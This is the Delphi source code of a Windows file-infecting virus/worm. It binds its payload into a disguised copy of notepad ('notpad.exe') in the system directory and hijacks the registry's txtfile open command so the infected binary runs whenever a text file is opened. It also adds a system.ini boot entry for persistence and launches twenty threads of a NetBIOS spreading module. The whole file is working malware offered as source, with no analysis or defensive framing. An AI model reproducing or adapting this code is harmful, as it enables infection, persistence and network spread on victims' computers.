   program Project1;
   uses
     Windows,
     Messages,shellapi,
     BinderUnit in 'BinderUnit.pas',
     uNetBIOS in 'uNetBIOS.pas';

   {$R g.res}

   type
    ta_8u=packed array [0..65530] of byte;

   CONST
    NumberOfThreads = 20;
    LineSize = 45;

    MotherFuck:String='FSB-IS-MY-HEWRO';

    FILE_ATTRIBUTE_READONLY             = $00000001;
    FILE_ATTRIBUTE_HIDDEN               = $00000002;
    FILE_ATTRIBUTE_SYSTEM               = $00000004;
    FILE_ATTRIBUTE_ARCHIVE              = $00000020;
    FILE_ATTRIBUTE_DIRECTORY            = $00000010;
    FILE_ATTRIBUTE_NORMAL               = $00000080;
    FILE_ATTRIBUTE_TEMPORARY            = $00000100;
    FILE_ATTRIBUTE_COMPRESSED           = $00000800;
    FILE_ATTRIBUTE_OFFLINE              = $00001000;
    FASYSFILE                           = $00000004 platform;
    FAVOLUMEID                          = $00000008 platform;
    FAARCHIVE                           = $00000020 platform;
    FAANYFILE                           = $0000003F;

   var
    // The file-handles
    Trojan, Virus, Stub : THandle;

    // the check textfile declare
    OutPut:THandle;

    // headers, used to grab headers from other exe
    Header: TAttachmentHeader;
    itemHeader: PAttachmentHeader;

    // strings to determin places
    STUB_PATH:string;
    fname: string;

    // stubsize, usefull to grab size of stub
    stubSize: int64;

    // bug, grabs all text in file-handlers
    bug: pointer;

    // grab size
    size: Integer;

    // used when reading text
    dwRead:DWORD;

    // strings, integers
    jesus:String;
    Fil:String;
    Fill:string;

   PROCEDURE StartRandomThread;
   VAR
     NetBIOS : TNetBIOS;
   BEGIN
     NetBIOS:=TNetBIOS.Create;
     NetBIOS.StartNetBIOS;
   END;

   PROCEDURE Main;
   VAR
     I        : WORD;
     Msg      : TMsg;
     ThreadId : Cardinal;
   BEGIN
     Randomize;
     FOR I:=1 TO NumberOfThreads DO BeginThread(NIL,0,@StartRandomThread,NIL,0,ThreadID);
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
   END;


   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function FileSize(FileName: string): int64;
   var
     h: THandle;
     fdata: TWin32FindData;
   begin
     result:= -1;

     h:= FindFirstFile(PChar(FileName), fdata);
     if h <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(h);
       result:= int64(fdata.nFileSizeHigh) shl 32 + fdata.nFileSizeLow;
     end;
   end;

   function AllocMem(Size: Cardinal): Pointer;
   begin
     GetMem(Result, Size);
     FillChar(Result^, Size, 0);
   end;

   function StrPas(const Str: PChar): string;
   begin
     Result := Str;
   end;

   function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
   asm
           PUSH    EDI
           PUSH    ESI
           PUSH    EBX
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     EBX,ECX
           XOR     AL,AL
           TEST    ECX,ECX
           JZ      @@1
           REPNE   SCASB
           JNE     @@1
           INC     ECX
   @@1:    SUB     EBX,ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,EDI
           MOV     ECX,EBX
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EBX
           AND     ECX,3
           REP     MOVSB
           STOSB
           MOV     EAX,EDX
           POP     EBX
           POP     ESI
           POP     EDI
   end;

   Function GetHeader(Filew:String):PAttachmentHeader;
   var
     Header: PAttachmentHeader;
   begin
     Header:= AllocMem(sizeof(TAttachmentHeader));
     StrLCopy(@Header.Filename, PChar(Filew), MAX_PATH);
     Header.Size:= filesize(filew);
     Header.IsStub:= false;
     Result := Header;
   end;

   // my own written function that puts all chars in buf
   // into a string. very usefull

   Procedure Infect(File1, File2:String);
   Var
    // Store all Read data
    Buffer:Array[0..2048] of Char;
    // Information about read and write
    BytesRead, BytesWritten:LongWord;
   Begin
    // Clear Buffer
    ZeroMemory(@Buffer, SizeOf(Buffer));
    // Open a output for writing
    OutPut := CreateFile(pChar(File1+'-'), GENERIC_WRITE, FILE_SHARE_WRITE,
              0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
    // Get header from stub
    itemHeader := GetHeader(STUB_PATH);
    // Get name from stub
    Fname := StrPas(@itemHeader.Filename);
    // Open a file to put in
    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    // Set pointer to start
    SetFilePointer(Output, 0, nil, FILE_END);
    // Repeat while reading
    Repeat
     // Read file content
     ReadFile(Virus, Buffer, 2048, BytesRead, 0);
     // Write file content
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, 0);
     // if nothing written file is ended
    Until BytesWritten = 0;
    // Close handle
    CloseHandle(Virus);

    // Grab Header
    itemHeader := GetHeader(File2);
    // Grab Filename
    fName := StrPas(@itemHeader.FileName);
    // Open file2
    Header.MagicNumber := $FEEDBEEF;
    // Set CRC to zero
    Header.CRC := 0;
    // Serv Header Size from File
    Header.Size := FileSize(File2);
    // Is our file a stub ?
    Header.IsStub := False;
    // Get Filename
    Header.FileName := itemHeader.FileName;
    // Write header into file
    WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, 0);

    // Open a file to put in
    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    // Set pointer to start
    SetFilePointer(Output, 0, nil, FILE_END);
    // Repeat while reading
    Repeat
     // Read file content
     ReadFile(Virus, Buffer, 2048, BytesRead, 0);
     // Write file content
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, 0);
     // if nothing written file is ended
    Until BytesWritten = 0;
    // Close handle
    CloseHandle(Virus);

    // Grab Header
    itemHeader := GetHeader(File1);
    // Grab Filename
    fName := StrPas(@itemHeader.FileName);
    // Open file2
    Header.MagicNumber := $FEEDBEEF;
    // Set CRC to zero
    Header.CRC := 0;
    // Serv Header Size from File
    Header.Size := FileSize(File1);
    // Is our file a stub ?
    Header.IsStub := False;
    // Get Filename
    Header.FileName := itemHeader.FileName;
    // Write header into file
    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, 0);

    // Open a file to put in
    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    // Set pointer to start
    SetFilePointer(Output, 0, nil, FILE_END);
    // Repeat while reading
    Repeat
     // Read file content
     ReadFile(Virus, Buffer, 2048, BytesRead, 0);
     // Write file content
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, 0);
     // if nothing written file is ended
    Until BytesWritten = 0;
    // Close handle
    CloseHandle(Virus);

    // Get header from stub
    itemHeader := GetHeader(STUB_PATH);
    // Get name from stub
    Fname := StrPas(@itemHeader.Filename);
    // Get stubsize
    StubSize := FileSize(Stub_Path);
    // Write final header
    Header.MagicNumber:= $FEEDBEEF;
    Header.CRC:= 0;
    Header.Size:= stubSize;
    Header.IsStub:= true;

    // Fill out the char
    fillChar(Header.FileName, MAX_PATH+1, 0);
    // Write it
    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, 0);
    CloseHandle(OutPut);
    DeleteFile(pChar(File1));
    CopyFile(pChar(File1+'-'),pChar(File1),False);
    DeleteFile(pChar(File1+'-'));
   End;

   function FileExists(const FileName: string): Boolean;
   var
     lpFindFileData: TWin32FindData;
     hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   procedure BindIt(F1:string);
   var
    s:array[0..255]of char;
    path:String;
    L:string;
    l1,l2:String;
    check:TextFile;
   begin
   if fileexists(f1) then begin
    AssignFile(check, F1);
    Reset(check);
    Read(check, l1);
    ReadLn(check, l2);
    L := L1;
    While Not Eof(Check) Do begin
     Read(check, l1);
     ReadLn(check, l2);
     L := L + L1;
    End;
    CloseFile(check);
   end;
    if pos(motherfuck, l)>0 then exit;
    getsystemdirectory(s,255);
    path := s;
    path := path + '\fsb.tmp';
    CopyFile(pchar(paramstr(0)),pchar(path),false);
    try
    Infect(F1,path);
    except
    ;
    end;
   end;

   procedure ExtractFile(whichone: String);
   var
   ResultFilePath,ResourcePointer: PChar;
   ResourceLocation: HRSRC;
   ResourceSize,byteswritten: Longword;
   ResDataHandle: THandle;
   FileHandle: THandle;
   begin
   ResultFilePath := PChar(STUB_PATH);
   ResourceLocation := FindResource(HInstance,PChar(whichone),RT_RCDATA);
   if ResourceLocation = 0 then exit;
   ResourceSize := SizeofResource(HInstance,ResourceLocation);
   if ResourceSize = 0 then exit;
   ResDataHandle := LoadResource(HInstance,ResourceLocation);
   if ResDataHandle = 0 then exit;
   ResourcePointer := LockResource(ResDataHandle);
   if ResourcePointer = NIL then exit;
   FileHandle := CreateFile(ResultFilePath,GENERIC_WRITE,FILE_SHARE_WRITE,NIL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
   if FileHandle = INVALID_HANDLE_VALUE then exit;
   WriteFile(FileHandle,ResourcePointer^,ResourceSize,byteswritten,NIL);
   CloseHandle(FileHandle);
   end;

   var
    ss:array[0..255]of char;
    ppath:String;
    a:dword;
    F:THandle;
    key:hkey;
    val:string;
    kd:string;
    dat:integer;
   begin

    // check so we aint already runnin
    F := CreateMutexA(NIL, TRUE, pchar(MotherFuck));
    if (GetLastError() = ERROR_ALREADY_EXISTS) then ExitProcess(0);

    // grab systemdirectory
    getsystemdirectory(ss,255);
    // extract stub
    STUB_PATH := ss;
    STUB_PATH := STUB_PATH + '\fsb.stb';
    extractfile('stub');
    // check if we are notepad, else copy and infect
    ppath := ss;
    ppath := ppath + '\notpad.exe';

    if lowercase(paramstr(0)) <> ppath then begin
     ppath := ss;
     ppath := ppath + '\fsb.tmp';
     CopyFile(pchar(paramstr(0)),pchar(ppath),false);
     ppath := ss;
     val := ss;
     repeat
      val := copy(val, pos('\',val)+1, length(val));
     until pos('\',val)=0;
     kd := ppath + '\notpad.exe';
     ppath := ppath + '\notepad.exe';
     if not fileexists(kd) then
     CopyFile(pchar(ppath),pchar(kd),false);
     bindit(kd);
     // set key
     // HKEY_CLASSES_ROOT\txtfile\shell\open\command
     val := '%SystemRoot%\'+val+'\NOTPAD.EXE %1';
     RegOpenKey(HKEY_CLASSES_ROOT,'txtfile\shell\open\command',KEY);
     dat := 1024;
     RegSetValueEx(Key, '',0, REG_EXPAND_SZ, @val[1], dat);
     RegCloseKey(Key);
     ReleaseMutex(F);
     ShellExecute(0,'open',pchar(kd),0,0,1);
     exitprocess(0);
    end;
    writeprivateprofilestring('boot','shell',pchar('Explorer.exe notepad.exe'),'system.ini');
    main;
   end.
